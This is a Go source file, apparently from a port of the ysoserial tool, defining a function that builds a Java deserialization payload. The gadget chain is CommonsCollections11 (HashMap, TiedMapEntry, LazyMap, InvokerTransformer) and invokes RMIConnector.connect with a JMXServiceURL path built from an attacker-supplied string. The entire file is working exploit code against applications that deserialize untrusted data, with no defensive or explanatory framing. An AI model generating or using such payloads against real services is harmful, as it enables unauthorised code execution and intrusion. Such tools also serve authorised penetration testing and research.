package ysoserial

func CommonsCollections11(cmd string) []byte {
	return ClassObject{
		name:             "java.util.HashMap",
		serialVersionUID: 362498820763181265,
		classDescFlags:   SC_SERIALIZABLE | SC_WRITE_METHOD,
		fields: []Field{
			{Float, "loadFactor", 0.75},
			{Integer, "threshold", 12},
		},
		objectAnnotations: interfaces(
			blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01},
			ClassObject{
				name:             "org.apache.commons.collections.keyvalue.TiedMapEntry",
				serialVersionUID: -8453869361373831205,
				classDescFlags:   SC_SERIALIZABLE,
				fields: []Field{
					{"Ljava/lang/Object;", "key", ClassObject{
						name:             "javax.management.remote.rmi.RMIConnector",
						serialVersionUID: 817323035842634473,
						classDescFlags:   SC_SERIALIZABLE | SC_WRITE_METHOD,
						fields: []Field{
							{"Ljavax/management/remote/JMXServiceURL;", "jmxServiceURL", ClassObject{
								name:             "javax.management.remote.JMXServiceURL",
								serialVersionUID: 8173364409860779292,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{Integer, "port", 0},
									{"Ljava/lang/String;", "host", 0x00},
									{Object, "protocol", "rmi"},
									{Object, "urlPath", "/stub/" + cmd},
								},
							}},
							{"Ljavax/management/remote/rmi/RMIServer;", "rmiServer", nil},
						},
						classAnnotations: interfaces(),
						super:            nil,
					}},
					{"Ljava/util/Map;", "map", ClassObject{
						name:             "org.apache.commons.collections.map.LazyMap",
						serialVersionUID: 7990956402564206740,
						classDescFlags:   SC_SERIALIZABLE | SC_WRITE_METHOD,
						fields: []Field{
							{"Lorg/apache/commons/collections/Transformer;", "factory", ClassObject{
								name:             "org.apache.commons.collections.functors.InvokerTransformer",
								serialVersionUID: -8653385846894047688,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{"[Ljava/lang/Object;", "iArgs", nil},
									{Object, "iMethodName", "connect"},
									{"[Ljava/lang/Class;", "iParamTypes", nil},
								},
								objectAnnotations: interfaces(
									blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00},
								),
								super: nil,
							}},
						},
						classAnnotations: interfaces(),
						super:            nil,
					}},
				},
				classAnnotations: interfaces(
					ClassDesc{
						name:             "nu1r",
						serialVersionUID: 0,
						classDescFlags:   0x00,
					}),
				super: nil,
			},
		),
		super: nil,
	}.SerializeWithMagicHeader()
}
